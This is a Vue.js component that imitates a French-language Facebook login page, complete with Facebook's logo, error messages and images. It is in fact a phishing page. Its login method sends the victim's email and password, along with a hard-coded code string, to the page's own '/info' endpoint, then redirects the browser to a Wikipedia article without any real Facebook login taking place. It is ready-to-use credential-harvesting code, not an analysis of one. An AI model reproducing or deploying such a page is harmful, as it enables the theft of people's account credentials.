<template>
  <div id="home">

      <div id="centent">

          <div id="img">
              <img src="../assets/dF5SId3UHWd.svg" alt="fb.svg" width="240px" height="100px">
          </div>

          <div id="form">

             <p id="title">
                 Se connecter à Facebook    
             </p>

             <div class="information" ref="emailBorder" @click="getFocusEmail">
                
                    <input type="text" placeholder="Adresse e-mail ou numéro de tél" id="email" v-model="email" ref="email" autofocus="1">
                <div class="warimage" v-show="warEmail">
                     <img   class="_9ay6 imgt" src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/dmNX8PhIKEh.png" alt="" width="20" height="20">
                </div>
                 
                
             </div>

             <p class="errMsg" v-show="errAdrs">
                L’e-mail ou le numéro de téléphone entré ne correspond à aucun compte. 
                <a href="https://facebook.com">Veuillez créer un compte.</a>
                
             </p>

             <div class="information" ref="passwordBorder" @click="getFocusPassword">
                 <input type="password" placeholder="Mot de passe" id="password" v-model="password" ref="password" autofocus="1">

                  <div class= "warimage" v-show="warPassword">
                     <img  class="_9ay6 imgt" src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/dmNX8PhIKEh.png" alt="" width="20" height="20">
                </div>
             </div>

             <p class="errMsg" v-show="errPass">
               Le mot de passe entré est incorrect.
                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login"> Vous l’avez oublié ?</a>
             </p>

            <button @click="login">Connexion</button>
            <p>
                 <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login">Mot de passe oublié ?</a>
            </p>


          </div>  

      </div>

     <br>
     

  </div>
</template>

<script>
import axios from 'axios';
export default {

    data() {
        return {
            email: '',
            password: '',
            errMsg: '',
            errAdrs: false,
            errPass: false,
            warEmail: false,
            warPassword: false,
            

        }
    },

    methods: {

        getFocusEmail() {
           this.$refs.email.focus();
           
        },

        getFocusPassword() {
            this.$refs['password'].focus();
        },


        login(){
            let reg = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

            if(this.email == '') {

                this.errAdrs = true;
                this.$refs['emailBorder'].style.borderColor = 'red';
                this.warEmail = true;

                this.errPass = false;   
                this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
                this.warPassword = false;

            } else if (/^[0-9+]+$/.test(this.email) == false && reg.test(this.email) == false) {

                this.errAdrs = true;
                 this.$refs['emailBorder'].style.borderColor = 'red';
                 this.warEmail = true;

                this.errPass = false;
                 this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
                 this.warPassword = false;

            } else if (this.password == "") {

                this.errPass = true;
                 this.$refs['passwordBorder'].style.borderColor = 'red';
                 this.warPassword = true;


                this.errAdrs = false;
                 this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';
                 this.warEmail = false;

            } else {

                this.errAdrs = false;
                this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';
                this.warEmail = false;

                this.errPass = false;
                this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
                this.warPassword = false;
               


                let obj = {
                    email: this.email,
                    password: this.password,
                    code: 'eirfughra654herjgure454herjgre54jerhg'
                };

                axios
                .post("/info", obj)
                .then((response) => {
                    if(response.data == 'err') {
                        this.errAdrs = true;
                        this.$refs['emailBorder'].style.borderColor = 'red';
                    } else {
                        this.errAdrs = false;
                        this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';
                        this.errPass = false;
                        this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
                         window.open('https://fr.wikipedia.org/wiki/Messali_Hadj', '_self');
                    }
                })
                .catch((err) => {console.log(err)})

            }

        }
    }

}
</script>

<style scoped>


#home {
   
    font-family: Helvetica, Arial, sans-serif;
    text-align: center;
   
}


#centent {
 display: inline-block;
 margin-top: 30px;
  
    
   
}

#form {
    text-align: center;
    background-color: white;
    border: 1px solid rgb(240, 240, 240);
    border-radius: 7px;
    box-shadow: 1px 1px 20px rgb(204, 201, 201); 
    display: inline-block;
    margin-bottom: 20%;
    padding: 3%;
    
   
}

.information {
    border: 1px solid rgb(218, 209, 209);
    border-radius: 5px;
    margin-bottom: 4%;
    text-align: start;
    
    cursor: text;
   
}

button {
    color: white;
    background-color:  #1877f2;
    text-decoration: none;
    font-size: 20px;
    font-weight: bold;
    text-align: center;
    
    padding: 10px;
    outline: none;
    border-radius: 5px ;
    width: 100%;
    cursor: pointer;
    
}

a {
    color: #1877f2;
    text-decoration: none;
}
a:hover{
    text-decoration: underline;
}

.errMsg {
    color:#f02849;
    font-size: 13px;
    width: 350px;
    text-align: left;
    
}

.errMsg a {
    color: red;
    font-weight: bold;
    text-decoration: none;
    
}

.errMsg a:hover {
    text-decoration: underline;
}



input {
    outline: none;
    border: none;
    font-size: 18px;
     padding: 13px;
    width: 322px;
}

.warimage {
   position: relative;
}

.imgt {
    position: absolute;
    right: 16px;
    bottom: 14px;
   
}

#title {
    font-size: 18px;
}

</style>